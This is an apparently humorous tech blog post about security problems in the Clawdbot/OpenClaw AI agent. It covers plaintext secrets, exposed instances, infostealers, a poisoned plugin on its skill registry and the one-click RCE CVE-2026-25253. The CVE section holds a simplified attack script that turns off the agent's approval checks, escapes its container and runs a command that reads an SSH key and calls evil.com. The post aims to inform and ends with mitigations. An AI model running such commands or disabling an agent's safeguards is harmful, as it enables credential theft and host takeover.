---
title: "Clawdbot: How a Lobster Turned Into a Security Nightmare in 10 Seconds Flat"
publishDate: "2026-02-04T10:00:00.000Z"
slug: "clawdbot-moltbot-openclaw-security-chaos"
description: "The story of how a bored Austrian developer created the fastest-growing AI project on GitHub, got C&D'd by Anthropic, lost his handles to crypto scammers in 10 seconds, and accidentally built a RAT with an LLM interface. Also, your credentials are probably on Shodan right now."
tags: ["ai", "security", "open-source", "clawdbot", "openclaw", "anthropic", "hacking", "opinion", "chaos", "vibe-coding"]
featured: true
draft: false
readTime: 14
---

## When Retirement Gets Boring

Look, I need to tell you about the absolute chaos that unfolded over the past couple of weeks. And no, for once it's not another JavaScript framework (though give it a week). This time it's about a bored Austrian developer, a space lobster, Anthropic's legal team, crypto scammers, and a security vulnerability that has infosec people screaming into the void.

Let me introduce you to [Peter Steinberger](https://steipete.com/), the guy who built and sold PSPDFKit, retired rich, got bored, and decided that "vibe coding" with AI was his new personality trait. His X bio literally says "Came back from retirement to mess with AI." Relatable, I guess, if your idea of relaxation involves accidentally building the most controversial open source project of 2026.

So what did Peter do? He noticed that when you run AI agents like Claude Code or Codex, they sometimes just... stop. They need input. They stall. And you have to sit there babysitting them like they're toddlers who forgot what they were doing mid-task. Peter wanted to check on his AI from his phone. Simple enough, right?

"When nobody had built it by last November, I decided: fine, I'll do it myself."

And thus, Clawdbot was born. A cute little space lobster mascot, a WhatsApp integration, and the beginning of what I can only describe as a cybersecurity horror movie that nobody auditioned for.

## What The Hell Is Clawdbot Anyway?

Imagine if you could text your computer like it's your personal assistant. "Hey, check my emails." "Book that restaurant for 8pm." "What meetings do I have tomorrow?" That's Clawdbot. An AI assistant that connects via WhatsApp, Telegram, or iMessage to whatever LLM you want (Claude, GPT, whatever) and can actually do things on your machine.

Unlike Siri or Alexa, which live in corporate cloud prisons, Clawdbot runs locally. Your data stays on your machine. No corporate surveillance. Sounds great, right? Privacy advocates rejoice! Your conversations aren't being fed to some advertising algorithm!

Except there's a tiny little problem. When security researchers started actually looking at how this thing works, they found something concerning.

```javascript
// how Clawdbot stores your secrets apparently
const storeCredentials = (secrets) => {
  fs.writeFileSync('~/.clawdbot/secrets.json', JSON.stringify(secrets));
  // encryption is for nerds
  // also its plaintext markdown sometimes lol
}
```

Yeah. All your VPN credentials, API tokens, corporate passwords, months of conversation history... sitting in plaintext in your home directory. Readable by literally any process running as your user. But we'll get to that. First, let's talk about what happens when you name your project a bit too close to an AI company's flagship product.

## Anthropic Has Entered The Chat

So Peter named his project "Clawdbot" with a cute character called "Clawd" - a playful space lobster. Adorable, right? Apparently a little too close to "Claude" for Anthropic's legal team.

On January 27th, Anthropic sent a trademark request. The lobster was too similar to the... uh... whatever Claude is supposed to be. Peter, being a reasonable person and not wanting to get sued into oblivion, agreed to rebrand. He chose "Moltbot" - because lobsters molt when they grow. Clever wordplay. Everyone's happy.

Except for what happened next.

During the literal seconds it took to rename his GitHub and X/Twitter accounts, crypto scammers pounced. "My old name was snatched in 10 seconds," Peter later said. TEN SECONDS. These vultures had been monitoring, waiting for exactly this moment.

Within hours, fake $CLAWD tokens launched on Solana. The market cap hit $16 million as speculators thought they were getting in early on the next big AI project. Peter had to frantically tweet "Any project that lists me as coin owner is a SCAM" while watching people get rugged in real-time.

The token collapsed. Scammers walked away with millions. Late buyers lost everything. And Peter was left dealing with both a rebrand AND a crypto fraud scheme wearing his project's skin. What a Tuesday.

DHH, never one to miss an opportunity to criticize a tech company, labeled Anthropic's trademark move as "customer hostile." Others pointed out the irony - Clawdbot was driving massive Claude API usage. Anthropic was essentially kneecapping a project that was making them money. But hey, trademark lawyers gotta trademark lawyer.

The project eventually settled on "OpenClaw" as its final name. By this point it had 82,000 GitHub stars. The fastest-growing repo in GitHub history. Everyone wanted to try the thing that Anthropic didn't want named after their chatbot. Streisand effect goes brrr.

## "I Ship Code I Don't Read"

Now here's where things get philosophically terrifying. Peter's approach to building this thing was... unique. In a Pragmatic Engineer interview, he dropped this gem: "I ship code I don't read."

Let that sink in. The creator of the most viral AI agent admits he doesn't read the code his AI writes for him. "Pull requests are dead, long live prompt requests," he said. He focuses on the prompts that generate code, not the code itself.

Look, I get the appeal of vibe coding. Let the AI do the boring stuff. But when your project has direct access to people's computers, can read their files, execute commands, access credentials, and control their digital lives... maybe read the code? Just a thought? Anyone?

```javascript
// Peter's development workflow, probably
const developFeature = async (feature) => {
  const code = await claude.generate(feature);
  // reading is for people who have time
  // also I trust you little guy
  await git.commit(code);
  await git.push();
  // ship it
}
```

I'm being a bit unfair. Peter actually advocates for "closing the loop" - letting AI verify its own work through tests and linting. But still. The guy built a tool that runs with full user privileges and identity, and his philosophy is "I don't read the code." Security researchers everywhere felt a disturbance in the Force.

## The Security Nightmare Begins

Let's talk about what happened when actual security professionals started poking at this thing. Spoiler: it's bad.

[Jamieson O'Reilly](https://dvuln.com/), founder of security firm Dvuln, found hundreds of Clawdbot instances exposed to the public internet. Not behind authentication. Just... open. He found 8 instances with completely open ports requiring zero authentication. 47 more with authentication but still accessible. The rest showed "varying levels of protection," which is security researcher speak for "a mess."

These exposed instances contained months of private messages, credentials, and API keys. Just sitting there. On Shodan. Waiting to be harvested.

[Hudson Rock](https://www.hudsonrock.com/) researchers found that commodity infostealers had already adapted. RedLine, Lumma, and Vidar - the Walmart of malware families - added Clawdbot directories to their target lists. Their FileGrabber modules now specifically sweep `%UserProfile%\.clawdbot\*.json` looking for secrets. These files contain everything from Jira credentials to VPN configs to literally months of conversation context.

The kicker? This happened within 48 hours of the project going viral. Infostealers added it to their target lists before most security teams even knew their employees were running it.

## CVE-2026-25253: The One-Click RCE

Then came the big one. Security researcher [Mav Levin](https://depthfirst.io/) discovered CVE-2026-25253 - a vulnerability with a CVSS score of 8.8 (that's bad). One-click remote code execution via a malicious link. Here's how it works:

The OpenClaw Control UI trusts `gatewayUrl` from the query string without validation. It auto-connects on load, sending your gateway token in the WebSocket payload. An attacker creates a malicious webpage with JavaScript that steals your auth token and establishes unauthorized WebSocket connections to your local OpenClaw server. The server accepts requests from any website because it doesn't validate origin headers.

```javascript
// how the attack works (simplified)
// attacker's malicious webpage

const stolenToken = getFromVictimBrowser();
const ws = new WebSocket('ws://localhost:8080/gateway');

ws.onopen = () => {
  // now I own your computer
  ws.send(JSON.stringify({
    token: stolenToken,
    command: 'exec.approvals.set',
    value: 'off' // disable all safety checks
  }));

  // escape docker sandbox
  ws.send(JSON.stringify({
    command: 'tools.exec.host',
    value: 'gateway' // run on host, not container
  }));

  // do whatever I want
  ws.send(JSON.stringify({
    command: 'run',
    value: 'cat ~/.ssh/id_rsa && curl evil.com/pwned'
  }));
};
```

The vulnerability was patched in version 2026.1.29, but the damage was done. How many instances are still running older versions? Based on the "I ship code I don't read" philosophy, I'm guessing a non-trivial amount.

## Supply Chain Attacks: The Cherry On Top

O'Reilly didn't stop at exposed instances. He demonstrated a supply chain attack on ClawdHub - the public registry where people share Clawdbot skills. Think npm, but for AI agent plugins. And with approximately zero moderation.

He uploaded a poisoned skill package that appeared legitimate. Artificially inflated the download count to 4,000+. Developers across 7 countries downloaded and installed it. The skills run with full Clawdbot privileges. No sandboxing. No code signing. No review process.

One researcher described new users as "essentially installing a remote access trojan (RAT) with an LLM interface." They think they're getting a simple productivity tool. What they're actually getting is kernel access with natural language commands.

## 53% Of Enterprises Gave It Privileged Access Over A Weekend

[Noma Security](https://noma.security/) dropped a stat that made every CISO I know break out in hives: **53% of enterprise customers gave Clawdbot privileged access over the weekend of January 24-27.**

A weekend. Less than 72 hours for more than half of enterprise users to grant full system access to an AI agent they read about on Hacker News.

The research found five major vulnerability categories:

1. **Control Plane Exposure**: Misconfigured proxies exposing admin panels to the internet
2. **Unrestricted Channel Access**: The bot accepts instructions from external messaging platforms with minimal restrictions
3. **Sandbox Failures**: Default execution uses full user privileges
4. **Plaintext Credential Storage**: We covered this - it's bad
5. **Supply Chain Vulnerabilities**: Community plugins inherit full privileges with zero vetting

When run as root - which apparently is a "common misconfiguration" - Clawdbot has complete kernel control. Your AI assistant can now do literally anything to your system. Progress!

## The Expert Responses

Security experts have been... not optimistic.

[Heather Adkins](https://cloud.google.com/security) from Google Cloud's security team had the most succinct advice: **"Don't run Clawdbot."**

Eric Schwake from Salt Security noted: "A significant gap exists between consumer enthusiasm for Clawdbot's one-click appeal and the technical expertise needed to operate securely."

Translation: people who can barely remember their passwords are deploying AI agents with root access because a cool demo video made it look easy.

Cisco's security team labeled it a potential "security nightmare." Palo Alto Networks called it "the next AI security crisis." And somewhere, Peter Steinberger is probably reading all this while going for a morning walk and recording a podcast about it.

## The Problem Nobody Wants To Admit

Here's the thing that makes this whole situation so frustrating. The concept isn't bad. Having an AI assistant that can actually do things on your computer is genuinely useful. Running it locally instead of in the cloud is, in theory, better for privacy.

But the implementation was rushed. The security model was basically "trust everything." And the person building it openly admits to not reading the code.

This is the vibe coding endgame. Move fast, let AI write everything, ship without review, deal with consequences later. It works fine when you're building a todo app. It's a catastrophe when you're building something with system-level access.

```javascript
// the philosophical problem
const aiDevelopment = {
  speed: "very fast",
  innovation: "exciting",
  securityReview: null,
  consequences: "somebody else's problem",

  async build() {
    while (true) {
      await this.ship();
      if (this.securityResearchersPanicking) {
        await this.hotfix();
      }
    }
  }
};
```

I'm not saying AI-assisted development is bad. I use it myself. But maybe - just maybe - when you're building tools that access credentials, execute commands, and have kernel access, you should actually look at what you're shipping?

## What Now?

If you're running Clawdbot/Moltbot/OpenClaw, here's what security researchers recommend:

1. Update to version 2026.1.29 or later (the one with the RCE patch)
2. Never expose the control plane to the internet
3. Always use authentication
4. Isolate it in a container or VM with minimal privileges
5. Don't run it as root (why would you even)
6. Audit any community plugins before installing
7. Consider if you actually need an AI with system access, or if you just thought the demo was cool

Honestly? The safest option might be Heather Adkins' advice. Just don't run it. At least not until the security model matures beyond "plaintext files and trust."

The project has potential. Local AI assistants that respect privacy could be transformative. But right now, it's a security research playground masquerading as a productivity tool. The 82,000 GitHub stars don't mean it's safe - they mean it's popular. Those aren't the same thing.

And Peter? He's already moved on to letting AI agents build their own social networks. Yes, really. That's a whole other article.

Welcome to 2026, where your AI assistant might be a security nightmare, but at least it has a cute lobster mascot.

---

## References

- [The Register: Clawdbot becomes Moltbot](https://www.theregister.com/2026/01/27/clawdbot_moltbot_security_concerns/)
- [The Hacker News: OpenClaw RCE Vulnerability](https://thehackernews.com/2026/02/openclaw-bug-enables-one-click-remote.html)
- [InfoStealers: ClawdBot The New Target](https://www.infostealers.com/article/clawdbot-the-new-primary-target-for-infostealers-in-the-ai-era/)
- [Noma Security: Clawdbot Privileged Access Research](https://noma.security/blog/customers-gave-clawdbot-privileged-access-and-noone-asked-permission/)
- [Pragmatic Engineer: Interview with Peter Steinberger](https://newsletter.pragmaticengineer.com/p/the-creator-of-clawd-i-ship-code)
- [DEV Community: The Complete Chaos Timeline](https://dev.to/sivarampg/from-clawdbot-to-moltbot-how-a-cd-crypto-scammers-and-10-seconds-of-chaos-took-down-the-4eck)
